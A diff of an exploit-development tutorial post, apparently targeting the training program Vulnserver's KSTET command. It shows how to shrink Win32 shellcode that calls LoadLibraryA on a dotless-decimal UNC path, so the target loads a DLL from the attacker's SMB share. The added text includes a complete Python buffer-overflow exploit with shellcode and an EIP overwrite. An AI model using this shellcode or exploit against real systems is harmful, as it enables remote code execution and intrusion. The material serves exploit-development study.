@@ -181,11 +181,11 @@ smbserver.py s .
 We continue execution and step into the call to LoadLibraryA, noticing our string has made it to the stack:
 ![call loadlibrary](/images/callloadlibrary.png)
 
-### Conclusion
+### Small, smaller, smallest
 
-The final length of our shellcode, including the adjustment of ESP, is 41 bytes. This is markedly shorter than a usual reverse shell and should also be shorter than most other Win32 API calls to gain code execution, such as `WinExec`, `ShellExecute` and `system`. 
+The length of our shellcode used so far, including the adjustment of ESP, is 41 bytes. This is markedly shorter than a usual reverse shell and should also be shorter than most other Win32 API calls to gain code execution, such as `WinExec`, `ShellExecute` and `system`. 
 
-There is also room to cut this one even shorter by using dotless decimal notation for the IP address. The IP address used here, `192.168.0.11` can be represented in dotless decimal as `3232235531`. If we replace this and convert the entire string to hex, we end up with:
+There is however room to cut this one even shorter by using dotless decimal notation for the IP address. The IP address used here, `192.168.0.11` can be represented in dotless decimal as `3232235531`. If we replace this and convert the entire string to hex, we end up with:
 
 ```
 .dll
@@ -194,6 +194,49 @@ There is also room to cut this one even shorter by using dotless decimal notatio
 3223
 \\32
 ```
-This removes the need for the padding and cuts down the total shellcode size to 37 bytes, down from 41. Still not quite as small as socket re-use, but definitely a useful tool to have on hand when dealing with cramped buffer spaces.
+This removes the need for the padding and cuts down the total shellcode size to 36 bytes, down from 41. Still not quite as small as socket re-use, but have can we go further?
+
+Luckily, Windows is quite helpful in loading libraries for us. The documentation mentions the following:
+>If the string specifies a module name without a path and the file name extension is omitted, the function appends the default library extension .dll to the module name. To prevent the function from appending .dll to the module name, include a trailing point character (.) in the module name string.
+
+So all we need to do is specify the name of our DLL without the extension, cutting a further 4 bytes off our string. 
+
+For now, it seems we can get a reverse shell using the following code:
+```python
+#!/usr/bin/python
+
+import sys
+import socket
+
+shellcode = ""
+shellcode += "\x83\xec\x7c" #sub esp,0x7c
+shellcode += "\x56"
+shellcode += "\x68\x5c\x73\x5c\x73"
+shellcode += "\x68\x35\x35\x33\x31"
+shellcode += "\x68\x33\x32\x32\x33"
+shellcode += "\x68\x5c\x5c\x33\x32"
+shellcode += "\x54"
+shellcode += "\xB8\x9E\x9A\xE2\x77"
+shellcode += "\xFF\xD0"
+
+
+buf = "KSTET "
+buf += "A"*2
+buf += shellcode
+buf += "A"*(68-len(shellcode))
+buf += "\x0C\x10\x40" #eip
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.12",9999))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
+```
+Resulting in the following call being made using LoadLibraryA:
+![smallest?](/images/smallest.png)
+
+Thanks for reading, feel free let me know if you found a way to cut down on this size even further.
+
 
 
